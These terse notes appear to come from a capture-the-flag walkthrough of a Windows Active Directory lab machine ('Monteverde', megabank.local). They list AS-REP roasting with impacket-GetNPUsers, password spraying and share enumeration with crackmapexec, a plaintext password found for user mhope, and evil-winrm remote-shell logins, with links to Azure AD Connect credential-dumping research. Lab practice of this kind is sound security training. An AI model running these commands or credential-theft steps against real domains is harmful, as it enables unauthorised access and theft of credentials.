impacket-GetNPUsers megabank.local/ -usersfile users.txt -dc-ip 10.129.110.218
SMB         10.129.110.218  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
evil-winrm -i 10.129.110.218 -u SABatchJobs -p SABatchJobs

crackmapexec smb 10.129.110.218 -u SABatchJobs -p SABatchJobs --shares

[+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$

evil-winrm -i 10.129.110.218 -u mhope -p '4n0therD4y@n0th3r$'

https://blog.xpnsec.com/azuread-connect-for-redteam/
https://github.com/fox-it/adconnectdump